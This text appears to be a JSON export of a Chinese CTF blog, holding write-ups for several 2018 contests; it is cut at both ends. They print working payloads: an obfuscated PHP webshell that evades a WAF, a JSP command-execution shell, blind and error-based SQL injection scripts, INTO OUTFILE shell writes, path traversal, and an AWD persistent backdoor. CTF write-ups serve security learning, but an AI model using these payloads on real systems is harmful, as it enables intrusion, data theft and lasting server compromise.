HTTP/1.1\\nHost: 127.0.0.1\\nConnection: Keep-Alive\\n\\n') # s.close() print 'ok' time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) 修改HOST和端口，然后运行脚本，apache会不断kill掉旧进程fork新进程，访问%00lambda_1得到flag getshell绕过waf上传文件getshell，列出后台的waf123$black_char = array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',' ', '!', '\"', '#', '%', '&amp;', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '&lt;', '&gt;', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\\\', '^', '`', '|', '+' , '&#123;' , '&#125;',\"'\"); 做法：~(X) 当X为一个汉字时对这个汉字取反第二位可以得到得到一个英文字符，我们利用这个性质构造webshell。eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替。1234567891011121314151617181920212223&lt;?php$______=_;$_=~(瞰);$__=$_[$_==$_];$_=~(范);$__=$__.$_[$_==$_];$_=~(范);$__=$__.$_[$_==$_];$_=~(皮);$__=$__.$_[$_==$_];$_=~(半);$__=$__.$_[$_==$_];$_=~(拉);$__=$__.$_[$_==$_];$_=~(为);$___=$_[$_==$_];$_=~(了);$___=$___.$_[$_==$_];$_=~(高);$___=$___.$_[$_==$_];$___=$______.$___;$_=$$___;//$_=Array$__($_[_])//$__=assert 密码是_执行命令system(%27cat%20./../../../../Th1s_14_f14g%27)拿到flag MultiSql注册进去后在用户信息中找到注入点，进行盲注1http://104.131.107.84:8588/user/user.php?id=2-(mid(user(),1,1)&gt;binary(0x2a)) 过滤了select等东西，又提示flag不再数据库中，尝试读文件。12345678910111213import requestscode=''cookie=&#123; 'PHPSESSID':'6tq2gt2c31o1reeq4j962sodt6'&#125;for i in range(1,10000): for j in range(32,255): url='http://104.131.107.84:8588/user/user.php?id=2-(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),%d,1)=binary(%s))'%(i,hex(j)) r=requests.get(url=url,cookies=cookie) if 'admin' in r.content: code+=hex(j)[2:] print code break 将文件以16进制打印出来，然后转换成文本。发现user.php是使用mysqli_multi_query进行查询的.mysqli_multi_query:执行多个针对数据库的查询所以这里应该就是写shell的地方。为了绕过select和单引号，我们使用MYSQL预处理语句:123set @sql = concat('create table ',newT,' like ',old);prepare s1 from @sql;execute s1; 将1select\"&lt;?php @eval($_POST['a']);?&gt;\" into outfile '/var/www/html/favicon/altman.php'; 进行编码贴上一个编码脚本12345b=''a='''select \"&lt;?php @eval($_POST['a']);?&gt;\" into outfile '/var/www/html/favicon/altman.php';'''for i in range(0,len(a)): b+='CHAR('+str(ord(a[i]))+'),'print b 然后写入执行命令拿到flag","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"CSTS-AWD-XI'AN","slug":"CSTS-AWD","date":"2018-05-28T13:29:17.000Z","updated":"2018-11-02T05:49:31.851Z","comments":true,"path":"2018/05/28/CSTS-AWD/","link":"","permalink":"http://altman.vip/2018/05/28/CSTS-AWD/","excerpt":"第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。","text":"第二次打AWD模式的比赛，体验还不错，至少没有像上次一样被打成跑马场。有了上次经验，这次拿到服务器后迅速改密码，dump源码，备份数据库，然后挂上了记录流量的脚本。源码放到D盾后扫到一些后门。我们直接注释掉，因为上次吃了亏，害怕又被打成跑马场，所以我们刚开始一直在防御。其实这里有些有过谨慎了，错过了最好的得分机会，排名靠前的队伍都是先进攻再慢慢防御的，虽然丢分多但是得分也多，我们前两个小时就丢了一次分，但是进攻太多，很多队伍都补上了洞，导致刚开始只拿到了14台机器的shell。上传了.index.php的不死马，这14台机器的shell都很稳定一直在得分。写出脚本定时的拿flag交flag后开始继续审计。下次还是要分工明确，队友补洞，我拿到shell后直接批量种马。【进攻拿分才是最重要的啊】 漏洞主办方留了差不多一大堆后门，放在D盾里扫出了一部分，然后定位一些危险函数找到一些，没什么好说的。主要说比赛结束前10分钟审出来了一个insert报错注入的洞。在service1的sql中，贴上关键代码1$sql = \"INSERT INTO staff VALUES('$idis','$username','$mail','$workname','$phoneis')\"; 这里面5个参数只有$workname没有做任何过滤，所以从这里入手。抓包后随便尝试下 workname=1’) 直接给了报错，尝试报错注入1workname=1','') and (updatexml(1,concat(0x7e,(select user()),0x7e),1));%23 成功返回user()这里可以直接读取文件，也能导出shell，时间原因我只尝试了读flag1workname=1','') and (updatexml(1,concat(0x7e,(select load_file('/home/flag')),0x7e),1));%23 成功读取，因为比赛马上结束，没有批量打，算是很可惜了。getshell的话可以直接用INTO OUTFILE导出木马在web目录里。可以先workname字段中存入一句话木马，然后利用payload导出php文件1workname=1','') and select workname from stall where idis=999 into out file '/var/www/html/sql/altman.php';%23 其他应该还有一个利用cache写文件的洞，全场没人利用，我也没有找到具体的利用方法，等之后想出来了再补充吧 再吐槽一下这比赛的check，居然是用nmap扫描服务，那我直接删目录岂不是无敌了？最后有好几个队伍，明明网站全部404，还没被扣分，这怎么玩，导致我控的服务器减少了一半。。。我佛了","categories":[],"tags":[{"name":"awd","slug":"awd","permalink":"http://altman.vip/tags/awd/"}]},{"title":"网络空间安全技术大赛","slug":"网络空间安全技术大赛","date":"2018-05-13T10:44:43.000Z","updated":"2018-11-02T05:49:43.732Z","comments":true,"path":"2018/05/13/网络空间安全技术大赛/","link":"","permalink":"http://altman.vip/2018/05/13/网络空间安全技术大赛/","excerpt":"WEB","text":"WEB web1任意注册登录后，发现改密码的功能，存在漏洞，抓包修改后改修改admin密码。登陆admin账户，发现img目录可读，在http://117.34.117.216/img/img726849685.jpg发现是flag web2.git泄露源码，利用githack恢复。index.php被加密，查看upload.php构造cookie上传shell1in_adminid=1，in_adminname=admin,in_adminpassword=1,in_permission=2,in_adminexpire=00e81e7d738c221945959d19c56cb33d 利用菜刀连接，找到fl4g.php1PM9SCREW †&gt;&lt;Þî6\u0017o=‘®vD&amp;©Ú?“LéXhpUò\u001cüM­\u0013\u0003ãÌósÂãL33CýRí¬¢½S2rœ&lt;’2ó\u001c\u0004x\u0012Ò7oä].º 也被加密 找到SCREW解密工具https://github.com/firebroo/screw_decode.git解密后得到flag{7cb3d823105433606ccac8fb75aed67c} web3跳转到QQ空间，抓包看一到一个url访问拿到一个JS文件，解混淆后审计，找到关键代码123456789$.ajax(&#123; url:'/f701fee85540b78d08cb276d14953d58', type:'POST', dataType:'json', data: \"data=\"+encodeURIComponent(encryptByDES($('#loginform').serialize(),key)), error:function(er)&#123; window.location.href='https://qzone.qq.com'; &#125;&#125;) 在ip，hrUW3PG7mp3RLd3dJu，LxMzAX2jog9Bpjs07jP可能存在注入。首先模拟JS上的加密，JS上使用的是一个标准的DES的ECB模式加密，在python中利用pyDes库重现加密过程然后进行时间盲注。脚本12345678910111213141516171819202122232425262728293031323334import pyDes import base64import requestsimport urlliburl='http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58'flag=''def des_ecb_encode(source, key): des_obj = pyDes.des(key.encode('utf-8'), pyDes.ECB, IV=None, pad=None, padmode=pyDes.PAD_PKCS5) des_result = des_obj.encrypt(source) return (des_result)key=\"MiaoMiao\"for i in range(1,100): for j in (33,127): #message=\"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='admin'),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP=\"%(i,j) #message=\"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP=\"%(i,j) message=\"ip=1.1.1.1&amp;hrUW3PG7mp3RLd3dJu=1',if((ascii(substr((select group_concat(password) from admin),%d,1))=%d),sleep(5),1))#&amp;LxMzAX2jog9Bpjs07jP=\"%(i,j) code = des_ecb_encode(message, key) pay= (base64.b64encode(code)) data=&#123; 'data':(pay) &#125; try: r=requests.post(url=url,data=data,timeout=4) except: flag+= chr(j) print flag break#admin,users#username,password#flag&#123;73ad1744f38b68ece51076c7ac77621b&#125; miscmisc3发现ICMP中的流量相似，仔细观察后发现每个请求都有两个字母不同，按时间线排序拼接后拿到flag{RyHgbCf5OhFEiyJnlt9c8ASP} RSA2e=3，典型低指数攻击。直接附上脚本1234567891011121314151617import gmpyc=80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491697548574007864446117693097103136799284683292648287334023253488891301144881769557674366138889636475162525325855368132832237345279798028008137655682278413635753791609965810603989005785747744993045461207072415730041608172272077090225741385971n=27262030738190162906068533309218248319312037416856794814532459866130196673561833084739048171769479893806671499522643803412108279907223895517897969906253626028270289028646596897429641138913001561947557784840311014399973312098056896539904624036584153785225626096007313018814076860235378686567457599895712604364100507424939342862464483596795761725357279364545154915110900098124905389351969357103586063992040096368146580315262263546850581515833590884397726108478477798668261762306189036525841356592859315437201733146083995028221597538824801113980100295046731791678895520928441645173205511865657977068061078456941189550383e=3i=0while 1: if gmpy.root((c+i*n),e)[1]==1: print \"success\" m=gmpy.root((c+i*n),e)[0] print m print i break i=i+1print m 然后16进制转文本得到 my password is: I_Lov5_RSA_Rel6te7_me8sagE_aTTacK","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"redhat2018-writeup","slug":"redhat2018-writeup","date":"2018-05-01T03:14:59.000Z","updated":"2018-11-02T05:48:22.075Z","comments":true,"path":"2018/05/01/redhat2018-writeup/","link":"","permalink":"http://altman.vip/2018/05/01/redhat2018-writeup/","excerpt":"这个比赛题目质量不错，也不是很难，体验极佳。","text":"这个比赛题目质量不错，也不是很难，体验极佳。 WEBsimple uploadweb签到题，题目说是上传，结果给个login页面尝试半天后找到了 upload.html ,直接上传php一句话，发现执行不了指令？突然看到后台是用JAVA写的。。。上传网上搜来的JSP马123456789101112&lt;% if(\"023\".equals(request.getParameter(\"pwd\")))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(\"&lt;/pre&gt;\"); &#125;%&gt; 成功执行指令拿到flag flag{2ad4ff03-cd30-4085-a5b2-ba18ebff6b05} shopping log比较麻烦的一道题，提示 Site is tmvb.com先修改host文件试试，不行。在这里踩坑好久，最后发现是要改成 www.tmvb.com进去后是比较常规的操作了，改referer头，改AL语言为JA。12\"referer\":\"www.DWW.COM\",\"Accept-Language\":\"ja\" 登陆进网站是一个订单查询。再结合两个hint。 hint: 不需要注入hint2：订单号从0000开始试可能不是一个明智的选择 很明显是订单号爆破，但是由于有一个md5验证，使得脚本极慢。。而我又不会写多线程，只能慢慢等了。附上python脚本123456789101112131415161718192021222324252627282930313233343536# encoding=utf-8import requestsimport hashlibdef md5(str1): return hashlib.md5(str1).hexdigest()def md51(str1): i = 0 while True: if md5(str(i))[0:6] == str1: return i else: i+=1url='http://www.tmvb.com/5a560e50e61b552d34480017c7877467info.php'header = &#123;\"referer\":\"www.DWW.COM\",\"Accept-Language\":\"ja\"&#125;cookie=&#123; 'PHPSESSID':'8tnae9j43ik44aia70sv2k5aq0'&#125;for i in range (312,9000): r=requests.get(url=url,headers=header,cookies=cookie) md=r.content[2687:2693] code=md51(md) print code url2='http://www.tmvb.com/api.php?action=report' data=&#123; 'TxtTid':10000-i, 'code':code &#125; k=requests.post(url=url2,data=data,headers=header,cookies=cookie) print 10000-i print k.content if 'error' not in k.content: break#9588 跑了快两个小时得到9588号订单 {“error”:0,”msg”:”Congradulations, your flag is flag{hong_mao_ctf_hajimaruyo}\\n”} biubiubiu尝试了一番注入无果后注意到page尝试目录穿越。成功访问到 etc/passwd1?page=../../../../../../../../../../etc/passwd 然后继续找文件读，读到access.log发现可以用修改UA头来控制文件内容写shell。成功拿到shell后翻遍目录也没找到 flag。注意到 conn.php，里面给了数据库账号密码。尝试连接，在admin表中password字段中发现flag flag{dbc98dd7-90fb-44f4-8dbe-35a72f07ec9d} miscNot Only Wireshark流量包打开发现可疑字段，提取数据后写成一个zip压缩包打开需要密码又发现 key=?id=1128%23 尝试1128不对，试出来密码就是 ?id=1128%23 【坑】打开看到flag 手工爆破先手工爆破拿到密码是某个文件名0328fc8b43cb2ddf89ba69fa5e6dbc05是压缩包密码打开后是加密的doc，继续暴力破解得到密码是5396《情系海边之城》又名《海边的曼彻斯特》是曼彻斯特编码F5F507是ID写脚本得到最后的flag12345678910111213141516171819a=0x123654AAA678876303555111AAA77611A321out=''flag=''b='0'+bin(a)[2:]for i in range(len(b) / 2): a1 = b[i*2:i*2+2] if a1=='01': out+='0' else: out+='1'print (out)for i in range(0,len(out),8): tmp=out[i:i+8][::-1] flag+=hex(int(tmp[:4],2))[2:] flag+=hex(int(tmp[4:],2))[2:]print flag.upper()5EFCF5F507AA5FAD77 cryptorsa system下载文件下来123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107import signaln = 0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92Fe = 0x10001def pad(s): s += (256 - len(s)) * chr(256 - len(s)) ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(s_box): ret[pos] = s[index] return ''.join(ret)def unpad(s): ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(invs_box): ret[pos] = s[index] return ''.join(ret[0:-ord(ret[-1])])def str2int(s): return int(s.encode('hex'), 16)s_box = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]invs_box = [ 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D]def mul(x, y, z): ret = 1 while y != 0: if y &amp; 1 != 0: ret = (ret * x) % z x = (x * x) % z y &gt;&gt;= 1 return retdef welcom(): signal.alarm(5) print r\"\"\" ____ ____ _ ______ ______ _____ _____ __ __ | _ \\/ ___| / \\ / ___\\ \\ / / ___|_ _| ____| \\/ || |_) \\___ \\ / _ \\ \\___ \\\\ V /\\___ \\ | | | _| | |\\/| || _ &lt; ___) / ___ \\ ___) || | ___) || | | |___| | | ||_| \\_\\____/_/ \\_\\ |____/ |_| |____/ |_| |_____|_| |_|\"\"\"def main(): welcom() flag = open('./flag', 'r').read() flag_len = len(flag) assert(flag_len == 38) flag = pad(flag) while True: print '''1. sign flag2. get signed flagPlease give me your choice :''' cmd = raw_input() if cmd == '1': assert(len(flag) == 256) flag = unpad(flag)[:flag_len] + raw_input('Please sign your flag (0 - %d): ' % (256 - flag_len)) assert(len(flag) &lt;= 256) flag = pad(flag) print 'Success' elif cmd == '2': signature = mul(str2int(flag), e, n) print 'Your signed flag ciphertext is : 0x%x' % signature else: print 'Bye bye' exit(0)if __name__ == '__main__': main() 直接附上爆破脚本 ,这里要用的pwntools12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394# coding=utf-8from pwn import *import signaln = 0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92Fe = 0x10001flag = \"\"a= 255def pad(s): s += (256 - len(s)) * chr(256 - len(s)) ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(s_box): ret[pos] = s[index] return ''.join(ret)def unpad(s): ret = ['\\x00' for _ in range(256)] for index, pos in enumerate(invs_box): ret[pos] = s[index] return ''.join(ret[0:-ord(ret[-1])])def str2int(s): return int(s.encode('hex'), 16)s_box = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]invs_box = [ 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D]def mul(x, y, z): ret = 1 while y != 0: if y &amp; 1 != 0: ret = (ret * x) % z x = (x * x) % z y &gt;&gt;= 1 return retwhile (1): x=chr(a)*218 x2='\\x01'*a r=remote(\"123.59.138.211\", 23333) r.sendline(\"1\") r.sendline(x) r.sendline(\"1\") r.sendline(x2) r.sendline(\"2\") r.recvuntil(\"0x\") x3=r.recvline().replace(\"\\n\",\"\") x4=int(x3,16) for i in range(33,127): if x4 == mul(str2int(pad(flag+chr(i)+x2)), e, n): flag += chr(i) break a -= 1 print flag r.close()","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"时间盲注学习","slug":"时间盲注学习","date":"2018-04-07T14:36:37.000Z","updated":"2018-11-02T05:50:10.305Z","comments":true,"path":"2018/04/07/时间盲注学习/","link":"","permalink":"http://altman.vip/2018/04/07/时间盲注学习/","excerpt":"0x00 前言完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&gt;。","text":"0x00 